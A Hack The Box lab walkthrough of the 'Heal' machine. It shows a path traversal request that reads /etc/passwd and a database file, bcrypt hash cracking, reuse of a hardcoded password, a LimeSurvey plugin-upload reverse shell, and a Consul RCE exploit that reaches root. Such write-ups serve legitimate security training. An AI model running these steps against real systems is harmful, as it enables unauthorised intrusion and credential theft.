# 🕵️ Heal HTB - Walkthrough

## 🔍 Initial Reconnaissance

My journey on Heal begins with a standard `nmap` scan:

```bash
nmap -sC -sV -A heal.htb 
```

The results reveal a trio of open ports:

-   **🛡️ Port 22/tcp:** SSH (OpenSSH)
-   **🌐 Port 80/tcp:** HTTP (Web Service)
-   **❓ Port 9001/tcp:** `tor-orport` (Interesting, but set aside for now)

Exploring the site on port 80 (`http://heal.htb`), I find a classic login/registration page. I attempt to register, but it seems not to work... 🧱 blocked! A first round of `gobuster` on the root yields nothing juicy.  निराशा

## 🕵️‍♀️ Digging Deeper with Burp and API

I decide to put `Burp Suite` to work to analyze the site's traffic and JavaScript code. And here's the breakthrough! 🔗 I find a reference to a separate hostname: **`api.heal.htb`**. Aha! A backend API!

I restart `gobuster`, this time targeting the API:

```bash
gobuster dir -u http://api.heal.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This time, interesting (though protected, Status 401) endpoints emerge:

-   `/download` 📂
-   `/profile` 📂
-   `/resume` 📂

## 🔓 Path Traversal and Credentials

Testing the `/download` endpoint, I discover a **Path Traversal** vulnerability! Initially, I get blank pages, but by playing with `Burp Suite` and adding a **`Bearer` token**, I manage to construct the winning request:

```http
GET /download?filename=../../../../../../../../etc/passwd HTTP/1.1
Host: api.heal.htb
Authorization: Bearer <YOUR_TOKEN_HERE> 
# ... (other headers as in the original example) ...
```

Success! 📜 I download `/etc/passwd` and find two users with shells: **`ralph`** and **`ron`** 👤👤.

Still leveraging Path Traversal, I locate the `config/database.yml` file and from there, the database path: `storage/development.sqlite3`. I download that too! 💾

Inside the database, I find `ralph`'s bcrypt hash:
**`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`**

It's time to call `John the Ripper`:

```bash
echo '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

🔨 Crack! The password is: **`147258369`** 🔑.

With these credentials (`ralph` / `147258369`), I finally access the web application on port 80. ✅

## 🖥️ User Shell via LimeSurvey RCE

Once inside, I notice the presence of **LimeSurvey**. A quick search reveals an **RCE exploit via plugin upload**! 🐛

1.  I prepare a `php-rev.php` payload.
2.  I upload it as a plugin through the LimeSurvey interface.
3.  I activate it!
4.  I listen with `nc` on my machine:
 ```bash
 	nc -lvnp 4444 
   ```
5.  I perform the action that triggers the plugin... et voilà! I get a reverse shell as the `www-data` user. 🐚

Poking around the filesystem as `www-data`, I find the `config.php` file with a hardcoded password: **`AdmiDi0_pA$$w0rd`** 📄🤫.

I try this password with SSH for the user `ron`:

```bash
ssh ron@heal.htb
# Password: AdmiDi0_pA$$w0rd
```

Login successful! I am `ron`! I can finally capture the **🏴 user.txt** flag.

## 🚀 Privilege Escalation via Consul

I check local privileges and services as `ron`:

```bash
ss -lntp 
# or netstat -lntp
```

I discover a service listening only on `127.0.0.1` on port **`8500`** 👂. It's **HashiCorp Consul**!

To interact with it from my machine, I set up an **SSH Port Forwarding**:

```bash
# On the attacking machine
ssh -L 8500:127.0.0.1:8500 ron@heal.htb 
```

🚇 Now I can access `http://localhost:8500` from my browser. I identify the version and find a known RCE exploit for Consul (like **Exploit-DB 51117**) 💥.

I check if an ACL token is required (spoiler: no!):

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d '{}' 
```

The request is successful, confirming that ACLs are disabled or misconfigured ✔️. I modify the exploit script to **remove token handling** and launch it!

1.  I start another `nc` listener on my machine:

    ```bash
    nc -lvnp 9001 
    ```
2.  I execute the modified exploit pointing to `http://127.0.0.1:8500`, configuring it to send a shell to my IP on port 9001. 🔥💻

Boom! I receive a connection... I check with `whoami`... I am **`root`**! 👑

I navigate to `/root/` and capture the final flag **🏴 root.txt**.

---

🎯 **Heal HTB Pwned!** 🎉 Mission accomplished